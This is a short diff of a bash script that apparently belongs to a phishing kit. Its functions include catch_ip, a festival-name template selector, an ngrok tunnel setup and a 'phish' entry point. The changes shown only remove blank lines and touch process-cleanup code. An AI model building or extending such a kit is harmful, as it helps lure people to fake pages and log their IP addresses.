@@ -85,11 +85,9 @@ if [[ $checkngrok == *'ngrok'* ]]; then
   pkill -f -2 ngrok > /dev/null 2>&1
   killall -2 ngrok > /dev/null 2>&1
 fi
-
 if [[ $checkphp == *'php'* ]]; then
   killall -2 php > /dev/null 2>&1
 fi
-
 exit 1
 }
 catch_ip() {
@@ -128,7 +126,6 @@ select_templet() {
 read -p $"${S4}Enter festival name==> ${T0}" fest_name
 fest_name="${fest_name//[[:space:]]/}"
 }
-
 ngrok_server() {
 echo
 processbar
@@ -194,26 +191,4 @@ cd assets
 banner
 dependencies
 phish
-
-
 #<<<----------END---------->>>
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
